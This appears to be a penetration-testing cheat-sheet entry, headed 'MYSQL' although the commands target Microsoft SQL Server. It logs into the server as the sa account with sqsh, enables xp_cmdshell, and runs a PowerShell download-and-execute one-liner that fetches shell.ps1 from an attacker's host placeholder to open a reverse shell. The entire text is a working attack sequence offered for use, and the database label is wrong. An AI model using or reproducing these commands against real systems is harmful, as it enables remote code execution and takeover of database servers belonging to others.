##### MYSQL
```
sqsh -S <ip> -U sa -P <password>
```

Enable xp_cmdshell into RvShell

```
xp_cmdshell 'whoami'
go
EXEC SP_CONFIGURE 'show advanced options', 1
reconfigure
go
EXEC SP_CONFIGURE 'xp_cmdshell', 1
reconfigure
go
xp_cmdshell 'whoami'
go
xp_cmdshell 'powershell "IEX(New-Object Net.WebClient).downloadString(\"http://<ip>:8000/shell.ps1\")"'
go
```
